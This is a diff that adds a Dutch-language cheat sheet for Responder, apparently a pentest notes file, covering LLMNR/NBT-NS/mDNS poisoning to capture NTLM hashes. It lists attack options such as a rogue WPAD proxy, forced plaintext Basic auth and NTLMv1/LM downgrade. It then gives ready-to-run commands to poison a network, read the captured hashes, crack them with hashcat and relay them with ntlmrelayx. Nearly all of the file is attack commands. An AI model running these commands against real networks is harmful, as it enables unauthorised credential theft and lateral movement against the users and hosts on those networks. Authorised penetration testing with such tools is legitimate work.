@@ -1,0 +1,61 @@
+# Responder — LLMNR/NBT-NS/mDNS poisoner (Linux)
+# Vangt NTLM hashes op via name resolution poisoning op het netwerk
+#
+# === Syntax ===
+# responder -I INTERFACE [opties]
+#
+# === Werking ===
+# Beantwoordt LLMNR, NBT-NS en mDNS broadcast queries.
+# Wanneer een host een naam niet kan resolven, stuurt Responder
+# een antwoord met het attacker IP. Het slachtoffer stuurt
+# vervolgens NTLM credentials die worden opgeslagen.
+#
+# === Belangrijkste opties ===
+# -I INTERFACE   Netwerk interface (eth0, tun0, etc.)
+# -w             WPAD rogue proxy server inschakelen
+# -F             ForceWpadAuth — forceer NTLM auth voor WPAD
+# -b             HTTP Basic Auth i.p.v. NTLM (plaintext wachtwoorden)
+# -r             NTLM downgrade naar NTLMv1 (makkelijker te kraken)
+# -P             Forceer proxy authenticatie
+# -v             Verbose output
+# -f             Fingerprint hosts die queries sturen
+# -A             Analyse modus — alleen luisteren, niet poisonen
+# --lm           LM hashing downgrade forceren
+# --disable-ess  Extended Session Security uitschakelen
+#
+# === Voorbeelden ===
+
+# Basis poisoning op eth0
+responder -I eth0
+
+# Volledige poisoning met WPAD en forced auth
+responder -I eth0 -wFb
+
+# Poisoning op VPN tunnel interface
+responder -I tun0 -wF
+
+# Analyse modus — alleen luisteren (recon)
+responder -I eth0 -A
+
+# Met verbose output en fingerprinting
+responder -I eth0 -wFv -f
+
+# NTLM downgrade naar NTLMv1
+responder -I eth0 -w --lm
+
+# Opgeslagen hashes bekijken
+cat /usr/share/responder/logs/Responder-Session.log
+ls /usr/share/responder/logs/*NTLM*
+
+# Hashcat kraken NTLMv2 (mode 5600)
+hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
+
+# Hashcat kraken NTLMv1 (mode 5500)
+hashcat -m 5500 hashes.txt wordlist.txt
+
+# Relay i.p.v. kraken (ntlmrelayx)
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# NOTE: Vereist root voor poorten < 1024 (SMB 445, HTTP 80)
+# NOTE: Hashes worden opgeslagen in /usr/share/responder/logs/
+# NOTE: Config aanpasbaar in /usr/share/responder/Responder.conf
